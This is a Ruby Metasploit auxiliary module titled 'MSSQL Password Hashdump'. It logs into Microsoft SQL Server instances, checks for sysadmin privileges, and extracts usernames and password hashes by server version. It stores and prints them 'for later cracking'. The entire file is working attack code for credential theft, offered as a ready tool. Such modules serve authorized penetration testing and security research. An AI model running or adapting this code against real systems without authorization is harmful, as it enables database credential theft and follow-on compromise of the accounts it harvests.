##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MSSQL
  include Msf::Auxiliary::Report

  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'MSSQL Password Hashdump',
      'Description'    => %Q{
          This module extracts the usernames and encrypted password
        hashes from a MSSQL server and stores them for later cracking.
        This module also saves information about the server version and
        table names, which can be used to seed the wordlist.
      },
      'Author'         => ['theLightCosine'],
      'License'        => MSF_LICENSE
    )
  end

  def run_host(ip)

    if !mssql_login_datastore
      print_error("Invalid SQL Server credentials")
      return
    end

    service_data = {
        address: ip,
        port: rport,
        service_name: 'mssql',
        protocol: 'tcp',
        workspace_id: myworkspace_id
    }

    credential_data = {
        module_fullname: self.fullname,
        origin_type: :service,
        private_data: datastore['PASSWORD'],
        private_type: :password,
        username: datastore['USERNAME']
    }

    if datastore['USE_WINDOWS_AUTHENT']
      credential_data[:realm_key] = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
      credential_data[:realm_value] = datastore['DOMAIN']
    end
    credential_data.merge!(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
        core: credential_core,
        last_attempted_at: DateTime.now,
        status: Metasploit::Model::Login::Status::SUCCESSFUL
    }
    login_data.merge!(service_data)

    is_sysadmin = mssql_query(mssql_is_sysadmin())[:rows][0][0]

    unless is_sysadmin == 0
      login_data[:access_level] = 'admin'
    end

    create_credential_login(login_data)

    # Grabs the Instance Name and Version of MSSQL(2k,2k5,2k8)
    instancename= mssql_query(mssql_enumerate_servername())[:rows][0][0].split('\\')[1]
    print_status("Instance Name: #{instancename.inspect}")
    version = mssql_query(mssql_sql_info())[:rows][0][0]
    version_year = version.split('-')[0].slice(/\d\d\d\d/)

    unless is_sysadmin == 0
      mssql_hashes = mssql_hashdump(version_year)
      unless mssql_hashes.nil?
        report_hashes(mssql_hashes,version_year)
      end
    end
  end


  # Stores the grabbed hashes as loot for later cracking
  # The hash format is slightly different between 2k and 2k5/2k8
  def report_hashes(mssql_hashes, version_year)

    case version_year
    when "2000"
      hashtype = "mssql"

    when "2005", "2008"
      hashtype = "mssql05"
    when "2012", "2014"
      hashtype = "mssql12"
    end

    this_service = report_service(
          :host  => datastore['RHOST'],
          :port => datastore['RPORT'],
          :name => 'mssql',
          :proto => 'tcp'
          )

    tbl = Rex::Text::Table.new(
      'Header'  => 'MS SQL Server Hashes',
      'Indent'   => 1,
      'Columns' => ['Username', 'Hash']
    )

    service_data = {
        address: ::Rex::Socket.getaddress(rhost,true),
        port: rport,
        service_name: 'mssql',
        protocol: 'tcp',
        workspace_id: myworkspace_id
    }

    mssql_hashes.each do |row|
      next if row[0].nil? or row[1].nil?
      next if row[0].empty? or row[1].empty?

      credential_data = {
          module_fullname: self.fullname,
          origin_type: :service,
          private_type: :nonreplayable_hash,
          private_data: "0x#{row[1]}",
          username: row[0],
          jtr_format: hashtype
      }

      credential_data.merge!(service_data)

      credential_core = create_credential(credential_data)

      login_data = {
        core: credential_core,
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      login_data.merge!(service_data)
      login = create_credential_login(login_data)

      tbl << [row[0], row[1]]
      print_good("Saving #{hashtype} = #{row[0]}:#{row[1]}")
    end
  end

  # Grabs the user tables depending on what Version of MSSQL
  # The queries are different between 2k and 2k/2k8
  def mssql_hashdump(version_year)
    is_sysadmin = mssql_query(mssql_is_sysadmin())[:rows][0][0]

    if is_sysadmin == 0
      print_error("The provided credentials do not have privileges to read the password hashes")
      return nil
    end

    case version_year
    when "2000"
      results = mssql_query(mssql_2k_password_hashes())[:rows]

    when "2005", "2008", "2012", "2014"
      results = mssql_query(mssql_2k5_password_hashes())[:rows]
    end

    return results

  end


end
